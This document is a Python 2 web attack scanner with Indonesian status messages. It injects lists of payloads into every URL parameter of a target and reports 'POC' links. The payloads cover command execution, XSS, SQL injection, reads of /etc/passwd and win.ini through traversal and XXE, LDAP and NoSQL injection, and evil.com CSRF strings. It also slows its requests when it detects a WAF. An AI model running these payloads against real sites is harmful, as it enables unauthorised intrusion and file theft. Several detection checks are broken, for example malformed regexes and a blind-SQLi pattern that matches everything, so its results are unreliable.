
import urllib
import re
from headers import *

def main_function(url, payloads, check):
        #This function is going to split the url and try the append paylods in every parameter value.
        opener = urllib.urlopen(url)
	vuln = 0
        if opener.code == 999:
                # Detetcing the WebKnight WAF from the StatusCode.
                print ga.red +" [~] WebKnight WAF Detected!"+ga.end
                print ga.red +" [~] Delaying 3 seconds between every request"+ga.end
                time.sleep(3)
        for params in url.split("?")[1].split("&"):
            #sp = params.split("=")[0]
            for payload in payloads:
                #bugs = url.replace(sp, str(payload).strip())
                bugs = url.replace(params, params + str(payload).strip())
		#print bugs
		#exit()
                request = useragent.open(bugs)
		html = request.readlines()
                for line in html:
                    checker = re.findall(check, line)
                    if len(checker) !=0:
                        print ga.red+" [*] Payload Found . . ."+ga.end
                        print ga.red+" [*] Payload: " ,payload +ga.end
                        print ga.green+" [!] Code Snippet: " +ga.end + line.strip()
                        print ga.blue+" [*] POC: "+ga.end + bugs
                        print ga.green+" [*] Selamat Bersenang-senang:D"+ga.end
                        vuln +=1
        if vuln == 0:                
        	print ga.green+" [!] Target is not vulnerable!"+ga.end
        else:
        	print ga.blue+" [!] Selamat kamu menemukan %i bugs :-) " % (vuln) +ga.end

# Here stands the vulnerabilities functions and detection payloads. 
def rce_func(url):
    headers_reader(url)
    print(ga.bold + " [!] Lagi scan: Remote Code/Command Execution " + ga.end)
    print(ga.blue + " [!] Covering Linux & Windows Operating Systems " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        ';${@print(md5(Rarken))}', ';${@print(md5("Rarken"))}', 
        ';$(echo Rarken)', '&&echo Rarken', ';phpinfo();', ';system("ls");',
    ]
    payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522Rarken%2522%2529%2529%257D%253B']
    payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
    check = re.compile(r"51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
    main_function(url, payloads, check)
    
def xss_func(url):
    print(ga.bold + "\n [!] Lagi scan: XSS " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        '%27%3ERarken%3Csvg%2Fonload%3Dconfirm%28%2FRarken%2F%29%3Eweb',
        '%78%22%78%3e%78', '%22%3ERarken%3Csvg%2Fonload%3Dconfirm%28%2FRarken%2F%29%3Eweb',
        'Rarken%3Csvg%2Fonload%3Dconfirm%28%2FRarken%2F%29%3Eweb',
        '<script>alert("Rarken")</script>', '<img src="x" onerror="alert(\'Rarken\')">',
        '"><script>alert(1)</script>', '"><img src=x onerror=alert(1)>'
    ]
    check = re.compile(r'Rarken<svg|x>x|<script>alert|<img src=x onerror', re.I)
    main_function(url, payloads, check)

def error_based_sqli_func(url):
    print(ga.bold + "\n [!] Lagi scan: Error Based SQL Injection " + ga.end)
    print(ga.blue + " [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        "3'", "3%5c", "3%27%22%28%29", "3'><", 
        "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27",
        "1' OR '1'='1", "1' OR '1'='1' --", "1' OR 1=1 --", "' OR ''='",
        "1' OR '1'='1'/*", "' OR '1'='1' --", "' OR 1=1--", "1' OR '1'='1' -- "
    ]
    check = re.compile(r"Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+quote|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    main_function(url, payloads, check)
    
def lfi_func(url):
    print(ga.bold + "\n [!] Lagi scan: Local File Inclusion " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        '../../../../etc/passwd', '../../../../../windows/win.ini',
        '../../../../../../../../etc/passwd', '../../../../../../../../windows/win.ini',
        '../../etc/passwd', '../windows/win.ini', '/etc/passwd', '/windows/win.ini'
    ]
    check = re.compile(r"root:|[boot loader]|[extensions]", re.I)
    main_function(url, payloads, check)
    
def directory_traversal_func(url):
    print(ga.bold + "\n [!] Lagi scan: Directory Traversal Vulnerabilities " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        '../../../../../../../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../../../../../../../windows/win.ini',
        '../../../../etc/passwd', '../../../../windows/win.ini',
        '../../../etc/passwd', '../../../windows/win.ini',
        '../../etc/passwd', '../../windows/win.ini',
        '../etc/passwd', '../windows/win.ini',
        '/etc/passwd', '/windows/win.ini'
    ]
    check = re.compile(r"root:|[boot loader]|[extensions]", re.I)
    main_function(url, payloads, check)
    
def command_injection_func(url):
    print(ga.bold + "\n [!] Lagi scan: Command Injection Vulnerabilities " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        '|cat /etc/passwd', ';cat /etc/passwd', '&&cat /etc/passwd',
        '|type C:\\boot.ini', ';type C:\\boot.ini', '&&type C:\\boot.ini'
    ]
    check = re.compile(r"root:|[boot loader]|[extensions]", re.I)
    main_function(url, payloads, check)
    
def csrf_func(url):
    print(ga.bold + "\n [!] Lagi scan: CSRF Vulnerabilities " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        '<img src="http://evil.com/transfer-funds">',
        '<form action="http://evil.com/transfer-funds"><input type="submit">',
        '<iframe src="http://evil.com/transfer-funds"></iframe>'
    ]
    check = re.compile(r"csrf_token|csrfmiddlewaretoken|CSRFToken", re.I)
    main_function(url, payloads, check)
    
def xssi_func(url):
    print(ga.bold + "\n [!] Lagi scan: Cross-Site Script Inclusion (XSSI) Vulnerabilities " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        '/api/user?id=1', '/api/user?id=2', '/api/user?id=3',
        '/api/user?id=4', '/api/user?id=5'
    ]
    check = re.compile(r'user_id:\d+', re.I)
    main_function(url, payloads, check)

def ssti_func(url):
    print(ga.bold + "\n [!] Lagi scan: Server-Side Template Injection (SSTI) Vulnerabilities " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        '{{7*7}}', '{{7*8}}', '{{7*9}}',
        '{{7*10}}', '{{7*11}}'
    ]
    check = re.compile(r'49|56|63|70|77', re.I)
    main_function(url, payloads, check)
    
def ldap_injection_func(url):
    print(ga.bold + "\n [!] Lagi scan: LDAP Injection " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        '*(|(objectclass=*))', '*)(uid=*))(|(uid=*))', '*)(objectclass=*))',
        '*)(objectclass=*)(|(objectclass=*))'
    ]
    check = re.compile(r"uid|objectclass", re.I)
    main_function(url, payloads, check)

def nosql_injection_func(url):
    print(ga.bold + "\n [!] Lagi scan: NoSQL Injection " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        '{"$ne": null}', '{"$ne": 1}', '{"$eq": ""}', '{"$gt": ""}', '{"$lt": ""}'
    ]
    check = re.compile(r"MongoDB|NoSQL", re.I)
    main_function(url, payloads, check)

def xxe_func(url):
    print(ga.bold + "\n [!] Lagi scan: XML External Entity (XXE) Vulnerabilities " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]><foo>&xxe;</foo>'
    ]
    check = re.compile(r"root:|[boot loader]", re.I)
    main_function(url, payloads, check)
    
def path_traversal_func(url):
    print(ga.bold + "\n [!] Lagi scan: Path Traversal " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        '../../../../../etc/passwd', '../../../../../../windows/win.ini',
        '../../../../../../../../../../etc/passwd', '../../../../../../../../../../windows/win.ini'
    ]
    check = re.compile(r"root:|[boot loader]", re.I)
    main_function(url, payloads, check)
    
def clickjacking_func(url):
    print(ga.bold + "\n [!] Lagi scan: Clickjacking " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = ['dummy_payload']
    check = re.compile(r"X-Frame-Options", re.I)
    main_function(url, payloads, check)
  
def insecure_cookies_func(url):
    print(ga.bold + "\n [!] Lagi scan: Insecure Cookies " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = ['dummy_payload']
    check = re.compile(r"Set-Cookie:.*(httponly|secure)", re.I)
    main_function(url, payloads, check)
  
def sqli_blind_func(url):
    print(ga.bold + "\n [!] Lagi scan: Blind SQL Injection " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        "' AND SLEEP(5)#", "' AND 1=2 UNION SELECT SLEEP(5)#", 
        "' OR SLEEP(5)#", "' AND IF(1=1, SLEEP(5), 0)#"
    ]
    check = re.compile(r"(.*)", re.I)
    main_function(url, payloads, check)
   
def xxes_func(url):
    print(ga.bold + "\n [!] Lagi scan: XML External Entity (XXE) Vulnerabilities " + ga.end)
    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
    payloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]><foo>&xxe;</foo>'
    ]
    check = re.compile(r"root:|[boot loader]", re.I)
    main_function(url, payloads, check)
